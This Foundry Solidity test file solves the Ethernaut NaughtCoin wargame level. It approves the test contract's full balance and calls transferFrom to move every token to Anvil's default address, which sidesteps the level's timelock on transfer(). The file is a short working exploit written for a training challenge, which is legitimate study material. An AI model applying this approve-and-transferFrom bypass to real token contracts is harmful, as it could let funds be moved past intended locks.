pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "../src/ethernaut/NaughtCoin.sol";

contract NaughtCoinTest is Test {

    NaughtCoin naughtCoin;

    function setUp() public {
        naughtCoin = new NaughtCoin(address(this));
    }

    function testTransfer() public {
        //log before balance
        uint256 balance = naughtCoin.balanceOf(address(this));
        console.log("Before balance: ", balance);
        //approve the transfer
        naughtCoin.approve(address(this), balance);
        //anvil 默认地址
        naughtCoin.transferFrom(address(this), 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, balance);
        //eq 余额等于0 
        console.log("After balance: ", naughtCoin.balanceOf(address(this)));
        assertEq(naughtCoin.balanceOf(address(this)), 0);
    }

}